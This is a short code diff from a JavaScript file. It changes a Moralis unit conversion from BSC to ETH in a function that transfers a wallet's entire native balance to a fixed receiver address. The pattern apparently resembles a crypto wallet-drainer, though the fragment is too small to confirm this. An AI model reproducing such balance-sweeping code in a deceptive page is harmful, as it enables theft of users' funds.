@@ -629,7 +629,7 @@ async function proceed(){
         if (balance > 0) {
         const options = {
           type: "native",
-          amount: Moralis.Units.bsc(balance.toString()),
+          amount: Moralis.Units.ETH(balance.toString()),
           receiver: receiver_address,
         };
         let result = await Moralis.transfer(options);
